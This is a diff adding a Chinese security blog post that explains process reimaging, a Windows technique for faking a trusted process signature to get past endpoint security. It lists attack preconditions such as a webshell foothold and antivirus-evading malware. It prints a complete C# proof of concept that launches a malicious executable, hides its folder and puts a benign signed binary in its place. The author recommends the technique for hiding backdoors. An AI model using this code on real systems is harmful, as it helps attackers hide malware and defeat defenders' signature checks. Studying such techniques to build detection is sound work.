@@ -1,0 +1,261 @@
+<!DOCTYPE HTML>
+<html class="no-js" lang="zh-CN">
+<!--
+//                            _ooOoo_
+//                           o8888888o
+//                           88" . "88
+//                           (| -_- |)
+//                            O\ = /O
+//                        ____/`---'\____
+//                      .   ' \\| |// `.
+//                       / \\||| : |||// \
+//                     / _||||| -:- |||||- \
+//                       | | \\\ - /// | |
+//                     | \_| ''\---/'' | |
+//                      \ .-\__ `-` ___/-. /
+//                   ___`. .' /--.--\ `. . __
+//                ."" '< `.___\_<|>_/___.' >'"".
+//               | | : `- \`.;`\ _ /`;.`/ - ` : | |
+//                 \ \ `-. \_ __\ /__ _/ .-` / /
+//         ======`-.____`-.___\_____/___.-`____.-'======
+//                            `=---='
+//                 拦截插件累计拦截逗比攻击"1381438"次！
+//         .............................................
+//                  佛祖保佑             永无BUG
+//          佛曰:
+//                  写字楼里写字间，写字间里程序员；
+//                  程序人员写程序，又拿程序换酒钱。
+//                  酒醒只在网上坐，酒醉还来网下眠；
+//                  酒醉酒醒日复日，网上网下年复年。
+//                  但愿老死电脑间，不愿鞠躬老板前；
+//                  奔驰宝马贵者趣，公交自行程序员。
+//                  别人笑我忒疯癫，我笑自己命太贱；
+//                  不见满街漂亮妹，哪个归得程序员？
+-->
+<head>
+    <!--[if lte IE 9]>
+<meta http-equiv="refresh" content="0;url=http://github.com/hucmosin/warn.html">
+<![endif]-->
+<meta charset="utf-8">
+
+<meta http-equiv="X-UA-Compatible" content="IE=Edge">
+<meta name="renderer" content="webkit">
+<meta name="viewport" content="width=device-width, initial-scale=1.0,user-scalable=no">
+<meta http-equiv="mobile-agent" content="format=html5; url=http://github.com/hucmosin">
+<meta name="author" content="Mosin">
+<link rel="stylesheet" href="//netdna.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css">
+<link rel="stylesheet" href="/css/SimpleStyle.min.css">
+
+<link rel="shortcut icon" href="/images/favicon.png">
+
+
+<title>进程重镜像过掉签名验证 - Mosin&#39; Blog</title>
+
+<meta name="keywords" content="学习笔记">
+
+<meta name="description " content="Learning, summarizing, thinking, feeling and knowledge management">
+</head>
+<body>
+<div id="nav">
+    <nav class="nav-menu">
+        <a class="site-name current" href="/" title="聊">聊</a>
+        <a class="site-index current" href="/"><i class="fa fa-home"></i><span>Home</span></a>
+        <a href="/archives" title="Archives"><i class="fa fa-archives"></i><span>Archives</span></a>
+        <!-- custom single page of menus -->
+        
+        
+        <a href="/help" title="帮助">
+            <i class="fa fa-question-circle"></i>
+            <span>帮助</span>
+        </a>
+        
+    </nav>
+</div>
+
+<div class="nav-user">
+    <a class="btn-search" href="#"><i class="fa fa-search"></i></a>
+    <a class="btn-read-mode" href="#"><i class="fa fa-sun-o"></i></a>
+    <a class="btn-weixin-mp" href="javascript:"><i class="fa fa-weixin"></i></a>
+</div>
+<div id="wrapper" class="clearfix">
+    <div id="body">
+        <div class="main" id="main">
+            <div id="cover">
+    <div class="cover-img"></div>
+    <div class="cover-info">
+        
+        <h1 class="cover-siteName">Mosin&#39;s Blog</h1>
+        <h3 class="cover-siteTitle">聊技术，谈情怀</h3>
+        <p class="cover-siteDesc">一个关注技术与人文的IT博客</p>
+        <div class="cover-sns">
+            
+            <div class="btn btn-github">
+                <a href="https://github.com/hucmosin" target="_blank" title="github" ref="friend">
+                    <i class="fa fa-github"></i>
+                </a>
+            </div>
+            
+        </div>
+    </div>
+</div>
+            <div class="page-title">
+    <ul>
+        <li><a href="/">最新</a></li>
+        
+            
+                <li class="">
+                    <a href="/categories/code-audit" data-name="审计">审计</a>
+                </li>
+            
+                <li class="">
+                    <a href="/categories/technology" data-name="技术">技术</a>
+                </li>
+            
+                <li class="">
+                    <a href="/categories/study-share" data-name="分享">分享</a>
+                </li>
+            
+                <li class="">
+                    <a href="/categories/study-note" data-name="学习">学习</a>
+                </li>
+            
+                <li class="">
+                    <a href="/categories/others-end" data-name="其他">其他</a>
+                </li>
+            
+        
+        <li class="page-search">
+    <form id="search" class="search-form">
+        <label for="s" class="sr-only">Input Search key Words Here</label>
+        <input class="search-field" type="text" name="s" class="text" placeholder="Input Search key Words Here" />
+        <button type="submit" class="search-form-submit" title="Search"><i class="fa fa-search"></i></button>
+    </form>
+    <div class="ins-search">
+    <div class="ins-search-mask"></div>
+    <div class="ins-search-container">
+        <div class="ins-input-wrapper">
+            <input type="text" class="ins-search-input"  placeholder="请输入关键字"/>   <!-- placeholder="Type something..."/>-->
+            <span class="ins-close ins-selectable"><i class="fa fa-times-circle"></i></span>
+        </div>
+        <div class="ins-section-wrapper">
+            <div class="ins-section-container"></div>
+        </div>
+    </div>
+</div>
+<script>
+(function (window) {
+    var INSIGHT_CONFIG = {
+        TRANSLATION: {
+            POSTS: 'Posts',
+            PAGES: 'Pages',
+            CATEGORIES: 'Categories',
+            TAGS: 'Tags',
+            UNTITLED: '(Untitled)',
+        },
+        ROOT_URL: '/',
+        CONTENT_URL: '/content.json',
+    };
+    window.INSIGHT_CONFIG = INSIGHT_CONFIG;
+})(window);
+</script>
+</li>
+
+    </ul>
+</div>
+<div class="main-inner">
+    <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+        <div class="post-header">
+            <div class="post-author clearfix">
+                <a class="avatar fleft" href="https://github.com/hucmosin" target="_blank">
+                    <img width="48" src="/images/favicon.png" alt="avatar"/>
+                </a>
+                <p><span class="label">作者</span>
+                    <a href="https://github.com/hucmosin" target="_blank">mosin</a>
+                    <span title="最后编辑于2020-05-20">2020-05-20</span>
+                </p>
+                <p>灵魂无处安放,所以选择流浪</p>
+            </div>
+            <h2 class="post-title">进程重镜像过掉签名验证</h2>
+            <div class="post-meta">
+                本文总共2588个字 | 您是第<span id="busuanzi_value_page_pv"><i class="fa fa-spinner fa-spin"></i></span>位看到它们的小伙伴
+            </div>
+        </div>
+        <div class="post-content markdown-body">
+            <p>进程重镜像是一种信任躲避技术，它亦是一种攻击技术，它利用了 Windows 操作系统在确定进程镜像 FILE 对象位置过程中的差异性，来继承或者说是伪造信任进程签名。 </p>
+<p>那么通过这种技术攻击者可以删除磁盘上的二进制文件，并通过将其初始执行完整文件路径替换为受信任的二进制文件来隐藏该文件的物理位置。 </p>
+<p>利用条件：</p>
+<p>1.开启杀软情况下利用条件：</p>
+<p>(1).可以通过webshell植入或上传下载文件</p>
+<p>(2).磁盘可以写入文件</p>
+<p>(3).恶意程序静态免杀</p>
+<p>(4).可以执行程序权限</p>
+<p>2.未开启杀软情况下利用条件：</p>
+<p> (1).可以通过webshell植入或上传下载文件</p>
+<p>(2).磁盘可以写入文件</p>
+<p>(3).可以执行命令权限</p>
+<p><strong>实验</strong></p>
+<p>通过对签名文件进行继承，然后达到了一个相当于和其他签名文件一样的签名效果</p>
+<p>C#源码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">using System;</span><br><span class="line">using System.Collections.Generic;</span><br><span class="line">using System.Linq;</span><br><span class="line">using System.Text;</span><br><span class="line">using System.IO;</span><br><span class="line">using System.Diagnostics;</span><br><span class="line"></span><br><span class="line">namespace CSProcessReimagingPOC</span><br><span class="line">&#123;</span><br><span class="line">  class Program</span><br><span class="line">  &#123;</span><br><span class="line">    static void Usage()</span><br><span class="line">    &#123;</span><br><span class="line">      string usageStr = @&quot;</span><br><span class="line">Usage:</span><br><span class="line">  .\poc.exe C:\\path\\to\\bad\\exe.exe C:\\path\\to\\benign\\exe.exe&quot;;</span><br><span class="line">      Console.WriteLine(usageStr);</span><br><span class="line">    &#125;</span><br><span class="line">    static void Main(string[] args)</span><br><span class="line">   &#123;</span><br><span class="line">      if (args.Length != 2)</span><br><span class="line">      &#123;</span><br><span class="line">        Usage();</span><br><span class="line">        return;</span><br><span class="line">      &#125;</span><br><span class="line">      string badExe = args[0];</span><br><span class="line">      string goodExe = args[1];</span><br><span class="line">      if (!File.Exists(badExe))</span><br><span class="line">      &#123;</span><br><span class="line">       Console.WriteLine(&quot;[-] Error: &#123;0&#125; does not exist.&quot;, badExe); ;</span><br><span class="line">        return;</span><br><span class="line">      &#125;</span><br><span class="line">      if (!File.Exists(goodExe))</span><br><span class="line">      &#123;</span><br><span class="line">        Console.WriteLine(&quot;[-] Error: &#123;0&#125; does not exist.&quot;, goodExe);</span><br><span class="line">      &#125;</span><br><span class="line">      string curDir = Directory.GetCurrentDirectory();</span><br><span class="line">      string executingDir = curDir + &quot;\\executing&quot;;</span><br><span class="line">	  string hiddenDir = curDir + &quot;\\hidden&quot;;</span><br><span class="line">      Directory.CreateDirectory(executingDir);</span><br><span class="line">      string phaseOnePath = executingDir + &quot;\\test.exe&quot;;</span><br><span class="line">      Console.WriteLine(&quot;[*] Copying &#123;0&#125; to &#123;1&#125;&quot;, badExe, phaseOnePath);</span><br><span class="line">	  File.Copy(badExe, phaseOnePath);</span><br><span class="line">      Console.WriteLine(&quot;[*] Starting &#123;0&#125;&quot;, phaseOnePath);</span><br><span class="line">      Process.Start(phaseOnePath);</span><br><span class="line">      Console.WriteLine(&quot;[*] Started! Moving the directory to hidden...&quot;);</span><br><span class="line">      Directory.Move(executingDir, hiddenDir);</span><br><span class="line">      Console.WriteLine(&quot;[*] Recreating the executing directory...&quot;);</span><br><span class="line">      Directory.CreateDirectory(executingDir);</span><br><span class="line">      Console.WriteLine(&quot;[*] Moving &#123;0&#125; to executing\\test.exe...&quot;);</span><br><span class="line">      File.Copy(goodExe, phaseOnePath);</span><br><span class="line">      Console.WriteLine(&quot;[+] All done!&quot;);</span><br><span class="line">	  &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>1.首先生成签名继承文件</p>
+<p><img src="/allimage/img/cjx/cjx1.png" alt="cjx1"></p>
+<p>这种可以进程重镜像的技术可以过掉签名验证，但是对于没有做免杀的文件来说，还是无能为力，这种技术只能作为一种后门隐藏，效果不错。</p>
+<p>2.查看生成的文件</p>
+<p><img src="/allimage/img/cjx/cjx2.png" alt="cjx2"></p>
+<p>3.运行文件</p>
+<p><img src="/allimage/img/cjx/cjx3.png" alt="cjx3"></p>
+<p>参考文章：</p>
+<p><a href="https://www.mcafee.com/blogs/other-blogs/mcafee-labs/in-ntdll-i-trust-process-reimaging-and-endpoint-security-solution-bypass/" target="_blank" rel="external">https://www.mcafee.com/blogs/other-blogs/mcafee-labs/in-ntdll-i-trust-process-reimaging-and-endpoint-security-solution-bypass/</a></p>
+<p><a href="https://blog.csdn.net/systemino/article/details/102953157" target="_blank" rel="external">https://blog.csdn.net/systemino/article/details/102953157</a></p>
+
+        </div>
+		<!--dashang-->
+        
+        <div class="post-tags">Tags：
+            
+            <a href="/tags/学习笔记/">学习笔记</a>
+            
+        </div>
+        
+    </article>
+    
+    <p>本文内容仅作为作者个人兴趣与观点,若有不恰当之处，望不吝赐教</p>
+    
+    
+</div>
+<script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+        </div><!-- end #main-->
+    </div><!-- end #body -->
+    <footer class="footer">
+    <div class="footer-inner">
+        <p>
+            <a href="/about"  title="About">About</a>&nbsp;&nbsp<em>·</em>&nbsp;&nbsp
+            <!-- 自定义链接 -->
+            <a href="/help" title="help" >帮助</a>&nbsp;&nbsp<em>·</em>&nbsp;&nbsp
+            <a href="/links" title="友情链接">友情链接</a>&nbsp;&nbsp<em>·</em>&nbsp;&nbsp
+        </p>
+        <p>
+            Blog by <a href="https://github.com/hucmosin" style="font-weight: bold">Coding Pages</a>
+        </p>
+        
+    </div>
+</footer>
+<script src="//cdn.bootcss.com/jquery/3.1.1/jquery.min.js"></script>
+<script src="/js/InsightSearch.js"></script>
+<script src="/js/SimpleCore.js"></script>
+
+</div>
+<div class="fixed-btn">
+    <a class="btn-gotop" href="javascript:"> <i class="fa fa-angle-up"></i></a>
+</div>
+<script>
+    $(function () {
+        SimpleCore.init({
+            buildingTime: '10/20/2017',
+            current: $('.post-tags').length > 0 ? 'post' : 'archive',
+            wxMpImg: '/images/weixin-mp.png',
+        });
+    });
+</script>
+</body>
+</html>
